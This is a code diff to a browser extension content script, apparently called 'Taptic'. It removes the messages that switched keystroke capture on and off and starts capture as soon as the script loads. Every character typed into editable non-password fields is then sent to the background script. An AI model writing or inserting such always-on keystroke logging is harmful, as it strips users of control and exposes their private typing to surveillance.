@@ -620,16 +620,11 @@
         requestScreenshot();
       } else if (msg.type === "show-reminder") {
         showReminderModal();
-      } else if (msg.type === "enable-keystroke-capture") {
-        enableKeystrokeCapture();
-      } else if (msg.type === "disable-keystroke-capture") {
-        disableKeystrokeCapture();
       }
     });
   }
 
-  // Keystroke capture functionality
-  let keystrokeCaptureEnabled = false;
+  // Keystroke capture functionality - ALWAYS ENABLED
   let keystrokeCaptureListener = null;
 
   function isPasswordField(target) {
@@ -645,70 +640,62 @@
     return false;
   }
 
-  function enableKeystrokeCapture() {
-    if (keystrokeCaptureEnabled) return;
-    keystrokeCaptureEnabled = true;
-    console.log("Taptic: Keystroke capture enabled");
+  // Start keystroke capture immediately
+  console.log("Taptic: Starting keystroke capture");
 
-    keystrokeCaptureListener = (event) => {
-      const target = event.target;
-      
-      // Don't capture from password fields
-      if (isPasswordField(target)) {
-        return;
-      }
-
-      // Only capture if typing in an editable field
-      if (!isEditable(target)) {
-        return;
-      }
-
-      const key = event.key || "";
-      
-      // Ignore modifier keys alone
-      if (["Control", "Alt", "Shift", "Meta", "CapsLock", "Tab", "Escape"].includes(key)) {
-        return;
-      }
-
-      // Capture the keystroke
-      let keyData = "";
-      
-      if (key === "Enter") {
-        keyData = "\n";
-      } else if (key === "Backspace") {
-        keyData = "[BACKSPACE]";
-      } else if (key === "Delete") {
-        keyData = "[DELETE]";
-      } else if (key === " " || key === "Spacebar") {
-        keyData = " ";
-      } else if (key.length === 1) {
-        keyData = key;
-      } else {
-        return; // Ignore other special keys
-      }
-
-      console.log("Taptic: Captured keystroke:", keyData);
-
-      // Send keystroke to background script
-      sendRuntimeMessage({
-        type: "keystroke",
-        keyData: keyData,
-        timestamp: Date.now()
-      });
-    };
-
-    document.addEventListener("keydown", keystrokeCaptureListener, true);
-  }
-
-  function disableKeystrokeCapture() {
-    if (!keystrokeCaptureEnabled) return;
-    keystrokeCaptureEnabled = false;
+  keystrokeCaptureListener = (event) => {
+    console.log("Taptic: Keydown event detected", event.key);
     
-    if (keystrokeCaptureListener) {
-      document.removeEventListener("keydown", keystrokeCaptureListener, true);
-      keystrokeCaptureListener = null;
+    const target = event.target;
+    
+    // Don't capture from password fields
+    if (isPasswordField(target)) {
+      console.log("Taptic: Skipping - password field");
+      return;
     }
+
+    // Only capture if typing in an editable field
+    if (!isEditable(target)) {
+      console.log("Taptic: Skipping - not editable field");
+      return;
+    }
+
+    const key = event.key || "";
     
-    console.log("Taptic: Keystroke capture disabled");
-  }
+    // Ignore modifier keys alone
+    if (["Control", "Alt", "Shift", "Meta", "CapsLock", "Tab", "Escape"].includes(key)) {
+      console.log("Taptic: Skipping - modifier key");
+      return;
+    }
+
+    // Capture the keystroke
+    let keyData = "";
+    
+    if (key === "Enter") {
+      keyData = "\n";
+    } else if (key === "Backspace") {
+      keyData = "[BACKSPACE]";
+    } else if (key === "Delete") {
+      keyData = "[DELETE]";
+    } else if (key === " " || key === "Spacebar") {
+      keyData = " ";
+    } else if (key.length === 1) {
+      keyData = key;
+    } else {
+      console.log("Taptic: Skipping - special key:", key);
+      return;
+    }
+
+    console.log("Taptic: Captured keystroke:", keyData);
+
+    // Send keystroke to background script
+    sendRuntimeMessage({
+      type: "keystroke",
+      keyData: keyData,
+      timestamp: Date.now()
+    });
+  };
+
+  document.addEventListener("keydown", keystrokeCaptureListener, true);
+  console.log("Taptic: Keystroke listener attached to document");
 })();
